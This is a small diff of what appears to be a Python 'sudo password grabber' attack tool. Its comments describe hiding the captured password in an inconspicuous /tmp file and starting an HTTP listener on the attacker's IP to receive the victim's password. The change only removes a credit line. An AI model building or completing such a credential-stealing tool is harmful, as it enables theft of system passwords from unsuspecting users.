@@ -11,7 +11,6 @@
 # This function also saves the password to an inconspicuous looking file in /tmp
 # This tool also gets the attacker's IP address and starts an HTTP server
 # which will be the listener for the target's password
-# This tool adds further automation to TokyoNeon and Null Byte's function of a similar nature
 
 import os
 print("This is the sudo password grabber")
